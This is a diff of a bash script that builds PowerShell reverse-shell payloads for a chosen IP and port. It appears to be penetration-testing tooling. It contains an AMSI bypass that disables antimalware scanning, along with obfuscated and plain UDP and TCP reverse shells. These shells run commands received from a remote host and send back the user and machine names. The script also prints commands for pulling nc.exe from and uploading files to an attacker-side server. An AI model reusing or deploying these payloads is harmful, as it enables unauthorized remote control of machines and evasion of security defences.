@@ -573,7 +573,7 @@ if [[ $3 == "w" ]]
 then 
     win="-W Hidden"
     at="@"
-#"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
+    #"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*Am*s'}).GetFields(2*20)|?{\$_-clike'*d'}).SetValue(\$null,\$true);"
   
 fi
@@ -589,7 +589,7 @@ fi
     yellowprint "download http://192.168.1.14/nc.exe /windows/temp/nc.exe" 
     echo -en "\n\nYou can upload files to Updog by entering:\n\n"
     yellowprint "upload /windows/system32/calc.exe http://192.168.1.14/upload "
-    echo -e "This requires Updog. You need to add /upload to your target-URL. \nAlso, be aware of: Your updog-folder path $updog_dir will be sent in the requests!"
+    echo -e "\nThis requires Updog. You need to add /upload to your target-URL. \nAlso, be aware of: Your updog-folder path $updog_dir will be sent in the requests!"
     greenprint "[Y/n]"
     read -r -n 1 ans
     case $ans in
@@ -613,12 +613,11 @@ if [[ $4 == "udp" ]]
 then
 #UDP
 
-shell="$AMSIb$func\$$endpoint = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (115,121,83,84,101,109,46,78,101,84,46,105,80,101,78,100,112,111,105,110,84) |%{ ( [char][int] \$_)})) | % {\$_}) ([System.Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (83,121,83,84,101,109,46,110,69,116,46,115,111,67,107,101,84,115,46,117,68,80,99,108,105,101,110,116) |%{ ( [char][int] \$_)})) | % {\$_}) ($PORT, [System.Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes($userinfo);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes(([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (& ([string]::join('', ( (105,101,120) |%{ ( [char][int] \$_)})) | % {\$_}) \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  ([string]::join('', ( (80,83) |%{ ( [char][int] \$_)})) | % {\$_}) + ' ' + (gl).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
-
+shell="$AMSIb$func\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.Sockets.UDPClient($PORT, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
 else
+    
 #TCP
-    #shell="$AMSIb$func\$$client = & ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) ([string]::join('', ( (115,89,83,116,101,77,46,110,69,116,46,115,79,99,75,69,116,115,46,116,67,80,67,108,73,101,110,116) |%{ ( [char][int] \$_)})) | % {\$_})('$IP',\$(0-0+0+0-0-0+0+$PORT));\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..$((65535))|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (& ([string]::join('', ( (110,69,119,45,111,66,106,69,67,116) |%{ ( [char][int] \$_)})) | % {\$_}) -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0, \$$i);\$$sendback = (iex \$$data 2>&1 | Out-String );\$$sendback2 = \$$sendback + $userinfo + '>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
-    shell="$AMSIb$func\$$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString(\$$bytes,0,\$$i);\$$sendback = (Invoke-expression \". { \$$data } 2>&1\" | Out-String ); \$$sendback2 = \$$sendback + (\$env:UserName) + '$at' + (\$env:UserDomain) + ([System.Environment]::NewLine) + (get-location)+'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
+   shell="$AMSIb$func\$$client = New-Object Net.Sockets.TCPClient('$IP',$PORT);\$$stream = \$$client.GetStream();[byte[]]\$$bytes = 0..65535|%{0};while((\$$i = \$$stream.Read(\$$bytes, 0, \$$bytes.Length)) -ne 0){;\$$data = (New-Object -TypeName Text.UTF8Encoding).GetString(\$$bytes,0,\$$i);\$$sendback = (Invoke-expression \". { \$$data } 2>&1\" | Out-String ); \$$sendback2 = \$$sendback + (\$env:UserName) + '$at' + (\$env:UserDomain) + ([Environment]::NewLine) + (get-location)+'>';\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$stream.Write(\$$sendbyte,0,\$$sendbyte.Length);\$$stream.Flush()};\$$client.Close()"
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
